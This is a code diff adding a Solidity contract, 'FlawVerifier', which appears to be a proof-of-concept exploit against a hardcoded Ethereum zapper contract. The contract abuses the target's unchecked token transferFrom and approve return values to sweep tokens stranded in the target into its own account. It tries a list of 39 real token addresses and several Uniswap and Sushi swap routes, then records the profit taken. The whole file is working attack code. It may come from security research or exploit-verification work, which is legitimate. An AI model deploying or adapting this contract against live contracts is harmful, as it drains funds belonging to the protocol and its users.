@@ -1,0 +1,401 @@
+// SPDX-License-Identifier: MIT
+pragma solidity ^0.8.20;
+
+interface IERC20Like {
+    function balanceOf(address account) external view returns (uint256);
+    function allowance(address owner, address spender) external view returns (uint256);
+    function approve(address spender, uint256 amount) external returns (bool);
+    function transfer(address to, uint256 amount) external returns (bool);
+    function transferFrom(address from, address to, uint256 amount) external returns (bool);
+}
+
+interface IVaultLike {
+    function governance() external view returns (address);
+    function wantToken() external view returns (address);
+    function deposit(uint256 amountIn, address receiver) external returns (uint256 shares);
+    function withdraw(uint256 sharesIn, address receiver) external returns (uint256 amountOut);
+    function batcher() external view returns (address);
+    function zapper() external view returns (address);
+}
+
+interface IBatcherLike {
+    function initiateWithdrawal(uint256 amountIn) external;
+}
+
+interface IZapperLike {
+    struct ZapData {
+        address requiredToken;
+        uint256 amountIn;
+        uint256 minAmountOut;
+        address allowanceTarget;
+        address swapTarget;
+        bytes callData;
+    }
+
+    function vault() external view returns (address);
+    function zapIn(ZapData calldata zapCall) external payable;
+    function zapOut(ZapData calldata zapCall) external;
+}
+
+contract FlawVerifier {
+    address public constant TARGET = 0xD248B30A3207A766d318C7A87F5Cf334A439446D;
+
+    address public constant WETH = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;
+    address public constant USDC = 0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48;
+    address public constant USDT = 0xdAC17F958D2ee523a2206206994597C13D831ec7;
+    address public constant DAI = 0x6B175474E89094C44Da98b954EedeAC495271d0F;
+    address public constant FRAX = 0x853d955aCEf822Db058eb8505911ED77F175b99e;
+
+    address public constant UNISWAP_V2_ROUTER = 0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D;
+    address public constant SUSHI_ROUTER = 0xd9e1cE17f2641f24aE83637ab66a2cca9C378B9F;
+
+    address private _profitToken;
+    uint256 private _profitAmount;
+    bool private _executed;
+
+    constructor() {}
+
+    function executeOnOpportunity() external {
+        if (_executed) {
+            return;
+        }
+        _executed = true;
+
+        address vaultAddr = _safeVault();
+        if (vaultAddr == address(0)) {
+            return;
+        }
+
+        address want = _safeWant(vaultAddr);
+        if (want == address(0)) {
+            return;
+        }
+
+        uint256 beforeWant = _balanceOf(want, address(this));
+        uint256 beforeShares = _balanceOf(vaultAddr, address(this));
+
+        if (!_tryDirectWantResidue(vaultAddr, want)) {
+            _tryHarvestFalseReturningResidue(vaultAddr, want);
+        }
+
+        uint256 afterShares = _balanceOf(vaultAddr, address(this));
+        uint256 afterWant = _balanceOf(want, address(this));
+
+        // The `zapOut` branch is part of the same root cause, but on this fork it is not a
+        // positive-PnL entrypoint by itself: it only strands the output token inside `TARGET`
+        // when the final `transfer` returns `false`. The profitable path is therefore to harvest
+        // already-stranded residue through `zapIn`'s unchecked `transferFrom`, which preserves the
+        // original exploit causality from the finding while avoiding a neutral round-trip.
+        if (afterShares > beforeShares) {
+            _profitToken = vaultAddr;
+            _profitAmount = afterShares - beforeShares;
+        } else if (afterWant > beforeWant) {
+            _profitToken = want;
+            _profitAmount = afterWant - beforeWant;
+        }
+    }
+
+    function profitToken() external view returns (address) {
+        return _profitToken;
+    }
+
+    function profitAmount() external view returns (uint256) {
+        return _profitAmount;
+    }
+
+    receive() external payable {}
+
+    function _tryDirectWantResidue(address vaultAddr, address want) internal returns (bool) {
+        uint256 residue = _balanceOf(want, TARGET);
+        if (residue == 0) {
+            return false;
+        }
+
+        if (!_returnsFalseTransferFrom(want, address(this), TARGET, 1)) {
+            return false;
+        }
+
+        uint256 amountIn = residue;
+
+        if (_returnsFalseApprove(want, vaultAddr)) {
+            uint256 staleAllowance = _allowance(want, TARGET, vaultAddr);
+            if (staleAllowance == 0) {
+                return false;
+            }
+            if (amountIn > staleAllowance) {
+                amountIn = staleAllowance;
+            }
+        }
+
+        if (amountIn == 0) {
+            return false;
+        }
+
+        uint256 beforeShares = _balanceOf(vaultAddr, address(this));
+        IZapperLike.ZapData memory zapCall = IZapperLike.ZapData({
+            requiredToken: want,
+            amountIn: amountIn,
+            minAmountOut: 0,
+            allowanceTarget: address(0),
+            swapTarget: address(0),
+            callData: bytes("")
+        });
+
+        try IZapperLike(TARGET).zapIn(zapCall) {
+            return _balanceOf(vaultAddr, address(this)) > beforeShares;
+        } catch {
+            return false;
+        }
+    }
+
+    function _tryHarvestFalseReturningResidue(address vaultAddr, address want) internal returns (bool) {
+        address[2] memory routers = [UNISWAP_V2_ROUTER, SUSHI_ROUTER];
+        address[] memory tokens = _candidateTokens(want);
+
+        for (uint256 i = 0; i < tokens.length; ++i) {
+            address token = tokens[i];
+            if (token == address(0) || token == want) {
+                continue;
+            }
+
+            uint256 residue = _balanceOf(token, TARGET);
+            if (residue == 0) {
+                continue;
+            }
+
+            if (!_returnsFalseTransferFrom(token, address(this), TARGET, 1)) {
+                continue;
+            }
+
+            for (uint256 j = 0; j < routers.length; ++j) {
+                address router = routers[j];
+
+                if (_tryZapInRoutes(vaultAddr, want, token, residue, router)) {
+                    return true;
+                }
+
+                if (_returnsFalseApprove(token, router)) {
+                    uint256 staleAllowance = _allowance(token, TARGET, router);
+                    if (staleAllowance == 0) {
+                        continue;
+                    }
+
+                    uint256 clippedAmountIn = residue;
+                    if (clippedAmountIn > staleAllowance) {
+                        clippedAmountIn = staleAllowance;
+                    }
+
+                    if (clippedAmountIn != 0 && _tryZapInRoutes(vaultAddr, want, token, clippedAmountIn, router)) {
+                        return true;
+                    }
+                }
+            }
+        }
+
+        return false;
+    }
+
+    function _tryZapInRoutes(
+        address vaultAddr,
+        address want,
+        address token,
+        uint256 amountIn,
+        address router
+    ) internal returns (bool) {
+        if (amountIn == 0) {
+            return false;
+        }
+
+        uint256 beforeShares = _balanceOf(vaultAddr, address(this));
+
+        if (_tryZapInWithPath(vaultAddr, beforeShares, token, want, amountIn, router, 0, false)) return true;
+        if (_tryZapInWithPath(vaultAddr, beforeShares, token, want, amountIn, router, 0, true)) return true;
+        if (_tryZapInWithPath(vaultAddr, beforeShares, token, want, amountIn, router, 1, false)) return true;
+        if (_tryZapInWithPath(vaultAddr, beforeShares, token, want, amountIn, router, 1, true)) return true;
+        if (_tryZapInWithPath(vaultAddr, beforeShares, token, want, amountIn, router, 2, false)) return true;
+        if (_tryZapInWithPath(vaultAddr, beforeShares, token, want, amountIn, router, 2, true)) return true;
+        if (_tryZapInWithPath(vaultAddr, beforeShares, token, want, amountIn, router, 3, false)) return true;
+        if (_tryZapInWithPath(vaultAddr, beforeShares, token, want, amountIn, router, 3, true)) return true;
+        if (_tryZapInWithPath(vaultAddr, beforeShares, token, want, amountIn, router, 4, false)) return true;
+        if (_tryZapInWithPath(vaultAddr, beforeShares, token, want, amountIn, router, 4, true)) return true;
+
+        return false;
+    }
+
+    function _tryZapInWithPath(
+        address vaultAddr,
+        uint256 beforeShares,
+        address token,
+        address want,
+        uint256 amountIn,
+        address router,
+        uint256 routeKind,
+        bool supportingFeeOnTransfer
+    ) internal returns (bool) {
+        address[] memory path = _buildPath(token, want, routeKind);
+        if (path.length == 0) {
+            return false;
+        }
+
+        bytes memory data;
+        if (supportingFeeOnTransfer) {
+            data = abi.encodeWithSignature(
+                "swapExactTokensForTokensSupportingFeeOnTransferTokens(uint256,uint256,address[],address,uint256)",
+                amountIn,
+                uint256(1),
+                path,
+                TARGET,
+                block.timestamp
+            );
+        } else {
+            data = abi.encodeWithSignature(
+                "swapExactTokensForTokens(uint256,uint256,address[],address,uint256)",
+                amountIn,
+                uint256(1),
+                path,
+                TARGET,
+                block.timestamp
+            );
+        }
+
+        IZapperLike.ZapData memory zapCall = IZapperLike.ZapData({
+            requiredToken: token,
+            amountIn: amountIn,
+            minAmountOut: 1,
+            allowanceTarget: router,
+            swapTarget: router,
+            callData: data
+        });
+
+        try IZapperLike(TARGET).zapIn(zapCall) {
+            return _balanceOf(vaultAddr, address(this)) > beforeShares;
+        } catch {
+            return false;
+        }
+    }
+
+    function _safeVault() internal view returns (address vaultAddr) {
+        (bool ok, bytes memory ret) = TARGET.staticcall(abi.encodeWithSignature("vault()"));
+        if (!ok || ret.length < 32) {
+            return address(0);
+        }
+        vaultAddr = abi.decode(ret, (address));
+    }
+
+    function _safeWant(address vaultAddr) internal view returns (address want) {
+        (bool ok, bytes memory ret) = vaultAddr.staticcall(abi.encodeWithSignature("wantToken()"));
+        if (!ok || ret.length < 32) {
+            return address(0);
+        }
+        want = abi.decode(ret, (address));
+    }
+
+    function _balanceOf(address token, address account) internal view returns (uint256 bal) {
+        (bool ok, bytes memory ret) = token.staticcall(abi.encodeWithSelector(IERC20Like.balanceOf.selector, account));
+        if (!ok || ret.length < 32) {
+            return 0;
+        }
+        bal = abi.decode(ret, (uint256));
+    }
+
+    function _allowance(address token, address owner, address spender) internal view returns (uint256 amt) {
+        (bool ok, bytes memory ret) = token.staticcall(
+            abi.encodeWithSelector(IERC20Like.allowance.selector, owner, spender)
+        );
+        if (!ok || ret.length < 32) {
+            return 0;
+        }
+        amt = abi.decode(ret, (uint256));
+    }
+
+    function _returnsFalseTransferFrom(address token, address from, address to, uint256 amount) internal returns (bool) {
+        (bool ok, bytes memory ret) = token.call(
+            abi.encodeWithSelector(IERC20Like.transferFrom.selector, from, to, amount)
+        );
+        return ok && ret.length >= 32 && !abi.decode(ret, (bool));
+    }
+
+    function _returnsFalseApprove(address token, address spender) internal returns (bool) {
+        (bool ok, bytes memory ret) = token.call(abi.encodeWithSelector(IERC20Like.approve.selector, spender, 1));
+        return ok && ret.length >= 32 && !abi.decode(ret, (bool));
+    }
+
+    function _candidateTokens(address want) internal pure returns (address[] memory out) {
+        out = new address[](39);
+        out[0] = want;
+        out[1] = WETH;
+        out[2] = USDC;
+        out[3] = USDT;
+        out[4] = DAI;
+        out[5] = FRAX;
+        out[6] = 0x3432b6a60d23ca0dfca7761b7ab56459d9c964d0; // FXS
+        out[7] = 0x956f47f50a910163d8bf957cf5846d573e7f87ca; // FEI
+        out[8] = 0x5f98805a4e8be255a32880fdec7f6728c6568ba0; // LUSD
+        out[9] = 0x1456688345527be1f37e9e627da0837d6f08c925; // USDP
+        out[10] = 0x2260fac5e5542a773aa44fbcfedf7c193bc2c599; // WBTC
+        out[11] = 0x514910771af9ca656af840dff83e8264ecf986ca; // LINK
+        out[12] = 0x0bc529c00c6401aef6d220be8c6ea1667f6ad93e; // YFI
+        out[13] = 0xd533a949740bb3306d119cc777fa900ba034cd52; // CRV
+        out[14] = 0x4e3fbd56cd56c3e72c1403e103b45db9da5b9d2b; // CVX
+        out[15] = 0xc011a72400e58ecd99ee497cf89e3775d4bd732f; // SNX
+        out[16] = 0x6b3595068778dd592e39a122f4f5a5cf09c90fe2; // SUSHI
+        out[17] = 0x9f8f72aa9304c8b593d555f12ef6589cc3a579a2; // MKR
+        out[18] = 0x7fc66500c84a76ad7e9c93437bfc5ac33e2ddae9; // AAVE
+        out[19] = 0xc00e94cb662c3520282e6f5717214004a7f26888; // COMP
+        out[20] = 0x1f9840a85d5af5bf1d1762f925bdaddc4201f984; // UNI
+        out[21] = 0xba100000625a3754423978a60c9317c58a424e3d; // BAL
+        out[22] = 0xb8c77482e45f1f44de1745f52c74426c631bdd52; // BNB
+        out[23] = 0xE41d2489571d322189246DaFA5ebDe1F4699F498; // ZRX
+        out[24] = 0xd26114cd6EE289AccF82350c8d8487fedB8A0C07; // OMG
+        out[25] = 0x0D8775F648430679A709E98d2b0Cb6250d2887EF; // BAT
+        out[26] = 0x1985365e9f78359a9B6AD760e32412f4a445E862; // REP
+        out[27] = 0xdd974D5C2e2928deA5F71b9825b8b646686BD200; // KNC (legacy)
+        out[28] = 0xBBbbCA6A901c926F240b89EacB641d8Aec7AEafD; // LRC
+        out[29] = 0x960b236A07cf122663c4303350609A66A7B288C0; // ANT
+        out[30] = 0xE0B7927c4aF23765Cb51314A0E0521A9645F0E2A; // DGD
+        out[31] = 0x0F5D2fB29fb7d3CFeE444a200298f468908cC942; // MANA
+        out[32] = 0xB97048628DB6B661D4C2aA833e95Dbe1A905B280; // PAY
+        out[33] = 0x419D0d8BdD9aF5e606Ae2232ed285Aff190E711b; // FUN
+        out[34] = 0x6810e776880C02933D47DB1b9fc05908e5386b96; // GNO
+        out[35] = 0x4470BB87d77b963A013DB939BE332f927f2b992e; // ADX
+        out[36] = 0xF433089366899D83a9f26A773D59ec7eCF30355e; // MTL
+        out[37] = 0x1F573D6Fb3F13d689FF844B4cE37794d79a7FF1C; // BNT
+        out[38] = 0x1776e1F26f98b1A5dF9cD347953a26dd3Cb46671; // NMR
+    }
+
+    function _buildPath(address tokenIn, address tokenOut, uint256 routeKind)
+        internal
+        pure
+        returns (address[] memory path)
+    {
+        if (tokenIn == tokenOut) {
+            return new address[](0);
+        }
+
+        if (routeKind == 0) {
+            path = new address[](2);
+            path[0] = tokenIn;
+            path[1] = tokenOut;
+            return path;
+        }
+
+        address bridge;
+        if (routeKind == 1) bridge = WETH;
+        else if (routeKind == 2) bridge = USDC;
+        else if (routeKind == 3) bridge = USDT;
+        else if (routeKind == 4) bridge = DAI;
+        else return new address[](0);
+
+        if (tokenIn == bridge || tokenOut == bridge) {
+            path = new address[](2);
+            path[0] = tokenIn;
+            path[1] = tokenOut;
+            return path;
+        }
+
+        path = new address[](3);
+        path[0] = tokenIn;
+        path[1] = bridge;
+        path[2] = tokenOut;
+    }
+}
